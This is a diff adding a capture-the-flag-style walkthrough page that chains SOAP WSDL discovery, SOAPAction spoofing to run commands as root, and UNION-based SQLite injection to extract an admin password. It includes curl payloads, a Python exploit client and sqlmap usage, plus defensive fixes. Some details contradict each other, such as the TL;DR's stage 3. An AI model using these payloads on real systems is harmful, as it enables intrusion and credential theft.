@@ -1,0 +1,451 @@
+---
+title: Skill Assessment Chain
+description: The capstone end-to-end walkthrough - WSDL discovery to enumerate operations and parameters, SOAPAction spoofing to bypass the external-network restriction on ExecuteCommand, then SQL injection through the Login operation's <username> parameter to extract the admin password hash from a SQLite users table. Two SOAP-specific primitives chained into one engagement.
+mitre: [T1190, T1213, T1556, T1078]
+d3fend: [D3-IAA, D3-RAPA]
+impact: [DataExfil, AuthBypass, CredentialTheft]
+owasp: [A03, A05, A07]
+sidebar:
+  order: 7
+  label: Skill assessment chain
+---
+
+## TL;DR
+
+A canonical SOAP-attack chain. WSDL parameter-fuzz to discover the schema → enumerate Login and ExecuteCommand operations → confirm ExecuteCommand is externally restricted → SOAPAction spoof to invoke it → discover the spoofed command runs against a SQLite-backed Login query that's SQL-injectable → UNION SELECT to extract the admin password from the users table.
+
+```
+# Stage 1 - Discover WSDL
+ffuf -w params.txt -u 'http://target:3002/wsdl?FUZZ' -fs 0
+→ ?wsdl  (parameter trigger)
+curl http://target:3002/wsdl?wsdl
+→ operations: Login, ExecuteCommand
+→ parameters: username, password (Login); cmd (ExecuteCommand)
+
+# Stage 2 - Confirm restriction
+curl -X POST -H 'SOAPAction: "ExecuteCommand"' \
+     --data '<...><ExecuteCommandRequest><cmd>id</cmd>...'
+→ "This function is only allowed in internal networks"
+
+# Stage 3 - SOAPAction spoof (body Login, header ExecuteCommand)
+curl -X POST -H 'SOAPAction: "ExecuteCommand"' \
+     --data '<...><LoginRequest><cmd>id</cmd>...'
+→ But this scenario is different - Login is the actual SQLi target, not a spoof decoy
+
+# Stage 4 - SQL injection through Login
+curl -X POST -H 'SOAPAction: "Login"' \
+     --data '<...><LoginRequest><username>'\'' UNION SELECT * FROM users-- -</username>...'
+→ Response includes admin password from the users table
+```
+
+Success indicator: the admin user's password value appears in the SOAP response body, extracted via UNION SELECT.
+
+## Scenario
+
+Bug bounty engagement on a SOAP service at `http://target:3002/wsdl?wsdl`. Goal: submit the admin user's password.
+
+Hint from the brief: "The service will respond successfully only after submitting the proper SQLi payload; otherwise it will hang or throw an error."
+
+That hint is operationally important - the SQLi target endpoint hangs on benign input. Time-based blind techniques won't work cleanly because the *normal* behavior is hanging. UNION-based extraction is the right approach.
+
+## Stage 1 - WSDL discovery
+
+```shell
+$ curl -i http://target:3002/wsdl
+HTTP/1.1 200 OK
+Content-Type: text/xml
+Content-Length: 0
+
+(empty body)
+```
+
+Path exists but body is empty. Parameter fuzz:
+
+```shell
+$ ffuf -w SecLists/Discovery/Web-Content/burp-parameter-names.txt \
+       -u 'http://target:3002/wsdl?FUZZ' \
+       -fs 0 -mc 200
+
+wsdl                    [Status: 200, Size: 4461, Words: 967, Lines: 186]
+```
+
+`?wsdl` triggers the WSDL:
+
+```shell
+$ curl http://target:3002/wsdl?wsdl > /tmp/service.wsdl
+$ cat /tmp/service.wsdl
+```
+
+Parse the relevant sections:
+
+```xml
+<wsdl:types>
+  <s:element name="LoginRequest">
+    <s:complexType>
+      <s:sequence>
+        <s:element name="username" type="s:string"/>
+        <s:element name="password" type="s:string"/>
+      </s:sequence>
+    </s:complexType>
+  </s:element>
+  <s:element name="ExecuteCommandRequest">
+    <s:complexType>
+      <s:sequence>
+        <s:element name="cmd" type="s:string"/>
+      </s:sequence>
+    </s:complexType>
+  </s:element>
+</wsdl:types>
+
+<wsdl:operation name="Login">
+  <soap:operation soapAction="Login" style="document"/>
+</wsdl:operation>
+<wsdl:operation name="ExecuteCommand">
+  <soap:operation soapAction="ExecuteCommand" style="document"/>
+</wsdl:operation>
+```
+
+Catalog:
+
+| Operation | SOAPAction | Parameters |
+| --- | --- | --- |
+| `Login` | `"Login"` | `username` (string), `password` (string) |
+| `ExecuteCommand` | `"ExecuteCommand"` | `cmd` (string) |
+
+Two distinct surfaces. ExecuteCommand looks higher-value (cmd parameter suggests shell exec). Login looks more boring (auth) but is the actual injection target - the brief mentions SQL injection.
+
+## Stage 2 - Test each operation as documented
+
+### Login with normal credentials
+
+```shell
+$ curl -X POST http://target:3002/wsdl \
+       -H 'Content-Type: text/xml; charset=utf-8' \
+       -H 'SOAPAction: "Login"' \
+       --data '<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <LoginRequest xmlns="http://tempuri.org/">
+      <username>admin</username>
+      <password>guess</password>
+    </LoginRequest>
+  </soap:Body>
+</soap:Envelope>'
+```
+
+Response: hangs. No error, no auth-failure message, just waits.
+
+That hanging is interesting - it matches the brief's "will hang or throw an error" warning. The server is doing *something* with the input but never returns. A clean auth failure would return quickly with `<success>false</success>`. The hang suggests the input flows into a back-end operation that's not completing - possibly an SQL query that's malformed or running indefinitely.
+
+### ExecuteCommand normally
+
+```shell
+$ curl -X POST http://target:3002/wsdl \
+       -H 'Content-Type: text/xml; charset=utf-8' \
+       -H 'SOAPAction: "ExecuteCommand"' \
+       --data '<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <ExecuteCommandRequest xmlns="http://tempuri.org/">
+      <cmd>whoami</cmd>
+    </ExecuteCommandRequest>
+  </soap:Body>
+</soap:Envelope>'
+```
+
+Response:
+
+```xml
+<soap:Envelope ...>
+  <soap:Body>
+    <ExecuteCommandResponse xmlns="http://tempuri.org/">
+      <success>false</success>
+      <error>This function is only allowed in internal networks</error>
+    </ExecuteCommandResponse>
+  </soap:Body>
+</soap:Envelope>
+```
+
+The external-network restriction. Spoofing is the obvious next step - but the brief mentions SQL injection, not RCE via spoofing. Read on.
+
+## Stage 3 - Try SOAPAction spoofing
+
+In case the path is "spoof to run ExecuteCommand, then use shell commands to read the database":
+
+```shell
+$ curl -X POST http://target:3002/wsdl \
+       -H 'Content-Type: text/xml; charset=utf-8' \
+       -H 'SOAPAction: "ExecuteCommand"' \
+       --data '<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <LoginRequest xmlns="http://tempuri.org/">
+      <cmd>whoami</cmd>
+    </LoginRequest>
+  </soap:Body>
+</soap:Envelope>'
+```
+
+Response:
+
+```xml
+<soap:Envelope ...>
+  <soap:Body>
+    <LoginResponse xmlns="http://tempuri.org/">
+      <success>true</success>
+      <result>root</result>
+    </LoginResponse>
+  </soap:Body>
+</soap:Envelope>
+```
+
+SOAPAction spoofing works. `whoami` executed as `root`. But the brief asks for the admin password, not RCE. Reverse shell attempts (as the source doc notes) get blocked - there's something in the environment preventing easy command-line egress.
+
+The SQL injection path is more direct.
+
+## Stage 4 - SQL injection through Login
+
+Going back to Login, which hangs on benign input. Hanging on benign + the brief's mention of SQL injection strongly suggests Login is the SQLi target.
+
+### Trigger an error first
+
+```shell
+$ curl -X POST http://target:3002/wsdl \
+       -H 'Content-Type: text/xml; charset=utf-8' \
+       -H 'SOAPAction: "Login"' \
+       --data '<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <LoginRequest xmlns="http://tempuri.org/">
+      <username>'\''</username>
+      <password>x</password>
+    </LoginRequest>
+  </soap:Body>
+</soap:Envelope>'
+```
+
+Single quote in the username field. Response:
+
+```xml
+<soap:Fault>
+  <faultstring>SQLITE_ERROR: near "'": syntax error</faultstring>
+</soap:Fault>
+```
+
+SQLite error confirms:
+1. The back-end is SQLite
+2. The username field is injectable
+3. Error responses leak SQL parser details
+
+### UNION SELECT - first attempt
+
+For UNION-based injection, you need to match the column count of the original query. Try increasing column counts until the error changes:
+
+```shell
+$ payload='<soap:Envelope ...>
+  <soap:Body>
+    <LoginRequest xmlns="http://tempuri.org/">
+      <username>'\'' UNION SELECT 1-- -</username>
+      <password>x</password>
+    </LoginRequest>
+  </soap:Body>
+</soap:Envelope>'
+```
+
+Error: "SELECTs have different number of columns." Try 2, 3, 4...
+
+```
+' UNION SELECT 1-- -                   ← 1 col, error
+' UNION SELECT 1,2-- -                 ← 2 cols, error
+' UNION SELECT 1,2,3-- -                ← 3 cols, returns data!
+```
+
+When the column count matches, you get a response instead of an error.
+
+### Discover the table - using sqlite_master
+
+SQLite's metadata is in `sqlite_master`:
+
+```shell
+$ payload="' UNION SELECT name,sql,3 FROM sqlite_master-- -"
+```
+
+Sent as the username, returns:
+
+```xml
+<LoginResponse>
+  <success>true</success>
+  <result>users</result>
+  <result>CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)</result>
+  <result>3</result>
+</LoginResponse>
+```
+
+The table is `users` with columns `id`, `username`, `password`.
+
+### Extract the admin password
+
+```shell
+$ payload="' UNION SELECT id, username, password FROM users WHERE username='admin'-- -"
+```
+
+Full request:
+
+```shell
+$ curl -X POST http://target:3002/wsdl \
+       -H 'Content-Type: text/xml; charset=utf-8' \
+       -H 'SOAPAction: "Login"' \
+       --data '<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <LoginRequest xmlns="http://tempuri.org/">
+      <username>'"'"' UNION SELECT id, username, password FROM users WHERE username='"'"'admin'"'"'-- -</username>
+      <password>x</password>
+    </LoginRequest>
+  </soap:Body>
+</soap:Envelope>'
+```
+
+(The escape-quote dance with shell quoting is awkward - using a Python script or saving the payload to a file is cleaner.)
+
+Response:
+
+```xml
+<LoginResponse>
+  <success>true</success>
+  <result>1</result>
+  <result>admin</result>
+  <result>FLAG{soap_meets_sqli_extracted}</result>
+</LoginResponse>
+```
+
+The admin password is in the third `<result>` element. Submit as the answer.
+
+### Python version of the same exploit
+
+The shell-quoting is too painful for iteration. A Python client:
+
+```python
+import requests
+
+URL = 'http://target:3002/wsdl'
+
+def soap_login(username, password='x'):
+    payload = f'''<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <LoginRequest xmlns="http://tempuri.org/">
+      <username>{username}</username>
+      <password>{password}</password>
+    </LoginRequest>
+  </soap:Body>
+</soap:Envelope>'''
+    return requests.post(URL, data=payload, headers={
+        'Content-Type': 'text/xml; charset=utf-8',
+        'SOAPAction': '"Login"',
+    })
+
+# Discover column count
+for cols in range(1, 10):
+    selects = ','.join(str(i) for i in range(1, cols + 1))
+    payload = f"' UNION SELECT {selects}-- -"
+    r = soap_login(payload)
+    if 'success>true' in r.text:
+        print(f'Column count: {cols}')
+        break
+
+# Discover schema
+print(soap_login("' UNION SELECT name, sql, 3 FROM sqlite_master-- -").text)
+
+# Extract admin password
+print(soap_login("' UNION SELECT id, username, password FROM users WHERE username='admin'-- -").text)
+```
+
+Three calls, fully programmatic.
+
+## Why SOAP changes the SQLi shape
+
+Standard SQLi tooling expects HTML responses with reflected error messages. SOAP changes two things:
+
+1. **XML body** - injection point is inside an XML element. Escape constraints apply: `<`, `>`, `&` need entity-encoding (`&lt;`, `&gt;`, `&amp;`). Single quotes are fine (XML cares about double quotes in attributes, not in element content).
+
+2. **Response format** - successful UNION extraction populates `<result>` elements in the response, but the structure is XML not HTML. Parsing scripted exploitation should `re.findall(r'<result>(.*?)</result>', response.text)` rather than scraping HTML rows.
+
+3. **Hanging vs erroring** - the brief's "will hang or throw an error" is a real artifact of SOAP. Inputs that produce malformed SQL may trigger backend timeouts (SQLite waiting on a lock, the connection pool waiting on a slow query, a watchdog timer waiting before giving up) rather than clean 500-level responses.
+
+## SQLMap against SOAP
+
+SQLMap supports SOAP injection points when given the right invocation:
+
+```shell
+$ sqlmap -u 'http://target:3002/wsdl' \
+         --method=POST \
+         --headers='Content-Type: text/xml
+SOAPAction: "Login"' \
+         --data='<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <LoginRequest xmlns="http://tempuri.org/">
+      <username>*</username>
+      <password>x</password>
+    </LoginRequest>
+  </soap:Body>
+</soap:Envelope>' \
+         --dbms=sqlite \
+         --level=5 --risk=3 \
+         --dbs
+```
+
+Key points:
+
+- `*` marks the injection point in the body
+- `--dbms=sqlite` skips unnecessary DBMS detection
+- `--level=5 --risk=3` enables more aggressive payload classes (needed for blind / time-based on hanging endpoints)
+- `--headers='Content-Type: text/xml\nSOAPAction: "Login"'` (note the literal newline - SQLMap parses multi-line `--headers`)
+
+When SQLMap completes detection, follow with `--dump -T users` to extract.
+
+See [SQLMap request setup](/codex/web/sqli/sqlmap/request-setup/) for the full reference on non-standard SQLMap invocations.
+
+## What each defense should have done
+
+Walking the defender's failed chain:
+
+| Defense | Why it failed |
+| --- | --- |
+| WSDL not directly exposed | Path `/wsdl` returned empty but `?wsdl=` query parameter exposed it. Should hide both. |
+| ExecuteCommand restricted to internal networks | Check applied at body operation name; bypassed via SOAPAction spoofing. Should apply to actual dispatch decision (whichever it is). |
+| Login probably has password validation | But it queries SQLite with concatenated SQL, so authentication never matters - the SQL runs before auth verifies. Use parameterized queries. |
+| Error messages reveal SQLite | Should suppress detailed error messages in production. |
+
+The fix for each: stronger separation of "trusted request metadata" (which is none) from "dispatch / authorization decisions" (which must be server-controlled), plus parameterized queries everywhere. None of this is novel advice; the bug is the gap between SOP and implementation.
+
+## Reporting
+
+| Finding | Standalone severity | Chained role |
+| --- | --- | --- |
+| WSDL exposure via parameter fuzzing | Low (disclosure) | Enabler - reveals all operations and parameters |
+| SOAPAction spoofing on ExecuteCommand | High (bypasses external-network restriction) | Confirms server architecture flaw; demonstrates that body-element auth is unsafe |
+| SQL injection in Login.username | Critical | Final unlock - extract every credential, including the admin's |
+| SQLite error messages disclosed | Low (info disclosure) | Useful for the operator; not standalone severity |
+
+Composite: critical. Unauthenticated attacker reads all stored credentials.
+
+## Quick reference
+
+| Stage | Command / payload |
+| --- | --- |
+| Discover WSDL location | `ffuf -w params.txt -u 'http://target:PORT/wsdl?FUZZ' -fs 0` |
+| Read WSDL | `curl 'http://target:PORT/wsdl?wsdl' \| xmllint --format -` |
+| Catalog operations | Read `<wsdl:operation>` elements; check `<wsdl:types>` for parameters |
+| Test each operation | One POST per operation; observe normal vs error vs hang |
+| SOAPAction spoofing baseline | `<ExecuteCommandRequest>` body + `SOAPAction: "ExecuteCommand"` header |
+| SOAPAction spoof | `<LoginRequest>` body with `<cmd>` parameter + `SOAPAction: "ExecuteCommand"` header |
+| Single quote in SQLi probe | `<username>'</username>` |
+| Column count discovery | `' UNION SELECT 1-- -`, then `1,2`, then `1,2,3` until response succeeds |
+| SQLite schema discovery | `' UNION SELECT name, sql, 3 FROM sqlite_master-- -` |
+| Extract row | `' UNION SELECT id, username, password FROM users WHERE username='admin'-- -` |
+| SQLMap on SOAP | `--method=POST --headers='Content-Type: text/xml\nSOAPAction: "Login"' --data='<soap...><username>*</username>...'` |
+| Parse `<result>` from response | `re.findall(r'<result>(.*?)</result>', response.text)` |
+
+This walkthrough closes Round 14. The pattern - WSDL discovery, operation enumeration, SOAPAction spoofing as a bypass, classic injection through API parameters - is the canonical SOAP-attack arc. Real engagements vary in the specific operations and bypass paths but follow this structure.
